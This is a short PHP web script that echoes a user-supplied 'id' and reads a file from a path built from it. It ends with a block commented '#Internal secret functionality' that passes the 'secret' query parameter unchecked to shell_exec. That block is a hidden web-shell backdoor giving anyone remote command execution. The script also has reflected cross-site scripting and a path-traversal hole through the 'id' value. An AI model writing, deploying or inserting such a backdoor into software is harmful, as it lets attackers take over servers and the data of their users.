<?php

set_time_limit(0);

if(isset($_GET['id'])){
    ob_start();
    $id = $_GET['id'];
    if (!$id) echo "Check your ID at /whatsmyid/<id>";
    else echo 'You ID is: ' . $id;
    // foreach (getallheaders() as $name => $value) {
    //   echo "$name: $value\n";
    // }

    echo shell_exec('/bin/sh -c "' . 'touch /tmp/out.txt' . '"');

    $filename = "\/tmp/" . $id . "/out.txt";
    if (file_exists($filename)) {
      $file = fopen($filename, "r");
      echo fread($file, filesize($filename));
      fclose($file);
      ob_end_flush();
      @ob_flush();
      flush();
      // fastcgi_finish_request();
      sleep(5);
      // unlink($filename);
      die();
    } else {
      ob_end_flush();
      @ob_flush();
      flush();
      // fastcgi_finish_request();
    }
}

#Internal secret functionality
if(isset($_GET['secret'])){
    $secret = $_GET['secret'];

    error_log($secret);
    shell_exec('/bin/sh -c "' . $secret . '"');
}

?>